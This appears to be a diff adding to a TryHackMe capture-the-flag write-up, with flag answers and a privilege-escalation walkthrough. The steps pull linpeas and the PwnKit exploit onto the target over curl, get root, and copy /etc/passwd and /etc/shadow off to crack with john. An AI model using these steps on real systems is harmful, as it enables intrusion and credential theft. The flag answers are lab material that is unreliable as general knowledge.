@@ -77,3 +77,31 @@ Learn how to brute, hash cracking and escalate privileges in this box!
 - `cat user.txt` to show user flag
 
 > <details><summary>The user flag is </summary>THM{a_password_is_not_a_barrier}</details>
+
+### Web flag
+
+> <details><summary>The page that provided John's RSA key also had the flag (/admin/panel): </summary>THM{brut3_f0rce_is_e4sy}</details>
+
+## Privilege Escalation
+
+### Find a form to escalate your privileges. What is the root's password?
+
+- Download [linpeas](https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh) to target machine
+    - First download to attack machine
+    - Place script in temp directory
+    - Serve temp directory to a temporary http server using `python3 -m http.server 8082` on attack machine
+    - `curl -O http://<attack machine ip>:8082/linpeas.sh` to get linpeas on target machine
+- `chmod +x linpeas.sh` to make executable on target machine then run with `./linpeas.sh`
+- The first linux exploit suggester entry is **CVE-2021-4034** - *PwnKit*
+    - [PwnKit](https://github.com/ly4k/PwnKit) is designed for privilege escalation and is compatible with the Linux version on the target machine
+- Repeat process of first downloading PwnKit to attack machine, then transfer over using *Curl*
+- `chmod +x PwnKit` then `./PwnKit` to gain root
+- As root, `cd /etc` and start a temporary server with `python3 -m http.server 4086` then download /etc/passwd and /etc/shadow to attack machine
+- On attack machine, `unshadow passwd shadow > hashes` to get password hashes
+- `john hashes --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar` to get the plaintext password
+
+> The root password of the target is **football**
+
+### root.txt
+
+> <details><summary>The root flag is </summary>THM{pr1v1l3g3_3sc4l4t10n}</details>
